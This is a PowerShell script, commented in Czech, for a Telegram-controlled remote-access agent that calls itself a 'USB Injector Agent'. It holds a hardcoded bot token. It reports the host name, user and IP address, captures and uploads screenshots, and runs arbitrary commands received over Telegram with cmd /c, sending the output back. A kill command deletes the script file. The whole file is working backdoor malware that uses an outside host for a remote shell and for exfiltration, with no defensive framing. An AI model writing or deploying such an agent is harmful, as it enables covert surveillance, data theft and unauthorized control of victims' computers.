$botToken = '8510265210:AAH9HMaiR1ineEhf4SHtZBCaiO1HBPbcYTw'
$stateFile = "C:\agent_state.txt"
$chatId = $null

# Načti uložený stav (pokud existuje)
if(Test-Path $stateFile) {
    $savedState = Get-Content $stateFile -Raw | ConvertFrom-Json
    $lastUpdateId = $savedState.lastUpdateId
    $chatId = $savedState.chatId
    Write-Host "Obnovuji stav: updateId=$lastUpdateId, chatId=$chatId"
} else {
    # Při prvním spuštění získej aktuální update_id a přeskoč staré zprávy
    try {
        $response = Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/getUpdates?timeout=1" -Method Get -TimeoutSec 5
        if($response.result.Count -gt 0) {
            $lastUpdateId = ($response.result | Select-Object -Last 1).update_id
            Write-Host "Preskakuji staré zprávy, začínám od update_id=$lastUpdateId"
        } else {
            $lastUpdateId = 0
        }
    } catch {
        $lastUpdateId = 0
    }
}

function Save-State {
    $state = @{
        lastUpdateId = $lastUpdateId
        chatId = $chatId
    } | ConvertTo-Json
    $state | Out-File -FilePath $stateFile -Force
}

function Send-Message($text) {
    if(!$chatId){return}
    $text = $text -replace '\\','\\' -replace '"','\"' -replace "`n",'\n' -replace "`r",''
    $json = "{`"chat_id`":`"$chatId`",`"text`":`"$text`"}"
    try {
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -ContentType 'application/json' -Body $json -ErrorAction Stop | Out-Null
    } catch {
        Write-Host "Send error: $_"
    }
}

while($true) {
    try {
        $url = "https://api.telegram.org/bot$botToken/getUpdates?offset=$($lastUpdateId+1)&timeout=10"
        $response = Invoke-RestMethod -Uri $url -Method Get -TimeoutSec 15
        
        foreach($update in $response.result) {
            $lastUpdateId = $update.update_id
            Save-State  # Ulož stav po každé zprávě
            
            if(!$chatId -and $update.message.chat.id) {
                $chatId = $update.message.chat.id
                Save-State
                Send-Message "[ONLINE] USB Injector Agent aktivni`nPC: $env:COMPUTERNAME`nUser: $env:USERNAME`n`nZadej prikaz nebo /help"
            }
            
            $cmd = $update.message.text
            if(!$cmd){continue}
            
            if($cmd -eq '/start') {
                Send-Message "System aktivni"
            } elseif($cmd -eq '/status') {
                $pc = $env:COMPUTERNAME
                $user = $env:USERNAME
                $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notlike "127.*"} | Select-Object -First 1).IPAddress
                Send-Message "[STATUS]`nPC: $pc`nUser: $user`nIP: $ip`nOnline"
            } elseif($cmd -eq '/help') {
                Send-Message "Prikazy:`n/status - Info o PC`n/help - Napoveda`n/screenshot - Udelej screenshot`n/kill - Ukonci agenta`n`nZadej CMD prikaz (ipconfig, dir, whoami, tasklist...)"
            } elseif($cmd -eq '/kill') {
                Send-Message "Agent se ukoncuje..."
                Remove-Item "C:\agent.ps1" -Force -ErrorAction SilentlyContinue
                Remove-Item $stateFile -Force -ErrorAction SilentlyContinue
                exit
            } elseif($cmd -eq '/screenshot') {
                Send-Message "Delam screenshot..."
                Add-Type -AssemblyName System.Windows.Forms,System.Drawing
                $screens = [System.Windows.Forms.Screen]::AllScreens
                $top = ($screens.Bounds.Top | Measure-Object -Minimum).Minimum
                $left = ($screens.Bounds.Left | Measure-Object -Minimum).Minimum
                $width = ($screens.Bounds.Right | Measure-Object -Maximum).Maximum
                $height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum
                $bounds = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
                $bmp = New-Object System.Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height)
                $graphics = [Drawing.Graphics]::FromImage($bmp)
                $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
                $screenshot = "C:\screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
                $bmp.Save($screenshot)
                $graphics.Dispose()
                $bmp.Dispose()
                
                # Pošli screenshot do Telegramu
                $uri = "https://api.telegram.org/bot$botToken/sendPhoto"
                $form = @{
                    chat_id = $chatId
                    photo = Get-Item -Path $screenshot
                }
                
                try {
                    Invoke-RestMethod -Uri $uri -Method Post -Form $form
                } catch {
                    Send-Message "[ERROR] Screenshot se nepodarilo odeslat"
                }
                
                Remove-Item $screenshot -Force
            } else {
                Send-Message "[EXECUTING] $cmd"
                try {
                    $output = cmd /c "$cmd" 2>&1
                    $exitCode = $LASTEXITCODE
                    
                    if($output) {
                        $result = "[EXIT: $exitCode]`n`n$output"
                        if($result.Length -gt 3500) {
                            $result = $result.Substring(0,3500) + "`n...(zkraceno)"
                        }
                        Send-Message $result
                    } else {
                        Send-Message "[EXIT: $exitCode]`n(zadny vystup)"
                    }
                } catch {
                    Send-Message "[ERROR] $($_.Exception.Message)"
                }
            }
        }
    } catch {
        Start-Sleep -Seconds 5
    }
}
